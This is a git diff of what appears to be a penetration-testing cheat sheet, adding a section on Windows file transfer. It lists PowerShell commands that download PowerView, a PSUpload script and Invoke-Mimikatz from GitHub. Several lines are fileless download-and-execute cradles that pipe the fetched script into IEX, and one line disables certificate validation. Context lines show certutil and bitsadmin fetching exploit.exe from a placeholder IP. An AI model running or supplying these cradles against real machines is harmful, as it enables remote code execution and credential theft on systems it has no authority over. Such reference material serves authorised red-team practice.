@@ -760,6 +760,32 @@ Algorithm       Hash                                                            
 MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
 ```
 
+- PowerShell DownloadFile
+
+```
+PS C:\> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+PS C:\> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+```
+
+- PowerShell Invoke-WebRequest
+
+```
+PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+PS C:\> iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -UseBasicParsing | IEX
+
+PS C:\> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+```
+
+- PowerShell DownloadString (Download & Execute Cradle - Fileless)
+
+```
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+PS C:\> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+```
+
 - Host Files
 
 ```
@@ -786,12 +812,6 @@ C:\> Invoke-WebRequest http://<IP address>/exploit.exe -OutFile exploit.exe
 C:\> Invoke-WebRequest http://<IP address>/exploit.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "exploit.exe"
 C:\> bitsadmin /transfer n http://<IP address>/exploit.exe C:\Temp\exploit.exe
 C:\> certutil.exe -verifyctl -split -f http://<IP address>/exploit.exe
-```
-
-- Download & Execute Cradle
-
-```
-C:\> IEX (New-Object Net.WebClient).DownloadString('http://<IP address>/exploit.exe')
 ```
 
 #8. - Restricted Shell Escapes
